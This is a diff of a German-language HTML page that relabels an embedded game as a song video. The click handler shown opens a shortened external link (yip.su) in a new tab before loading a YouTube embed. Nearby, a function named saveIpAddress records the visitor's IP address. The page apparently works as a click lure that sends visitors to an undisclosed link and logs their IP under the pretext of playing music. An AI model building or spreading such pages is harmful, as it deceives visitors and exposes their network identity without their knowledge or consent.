@@ -64,7 +64,7 @@
 
     <!-- Container für das eingebettete Spiel -->
     <div class="game-container" id="gameContainer">
-        <iframe id="gameFrame" src=""></iframe> <!-- Das Spiel wird erst nach Klick geladen -->
+        <iframe id="gameFrame" src="about:blank"></iframe> <!-- Das Video wird erst nach Klick geladen -->
     </div>
 
     <!-- Link zu den weiteren Informationen -->
@@ -86,13 +86,13 @@
             gameReady = true; // Setzt den Status auf "Spiel kann gestartet werden"
             window.open('https://yip.su/25KVS4', '_blank'); // Öffnet den Link in einem neuen Tab
             document.getElementById('gameContainer').style.display = 'block'; // Zeigt das Spiel an
-            document.getElementById('gameFrame').src = "https://www.youtube.com/embed/DbUcCcwmam4?enablejsapi=1"; // Lädt das Spiel
+            document.getElementById('gameFrame').src = "https://www.youtube.com/embed/DbUcCcwmam4?enablejsapi=1"; // Lädt das Video
         });
 
         // Funktion zum Abrufen und Speichern der IP-Adresse in LocalStorage
         function saveIpAddress() {
             if (!gameReady) {
-                alert('Bitte klicken Sie zuerst auf den Link "Weitere Informationen zu diesem Spiel", um das Spiel zu laden.');
+                alert('Bitte klicken Sie zuerst auf den Link "PLAY Song", um das Video zu laden.');
                 return;
             }
 
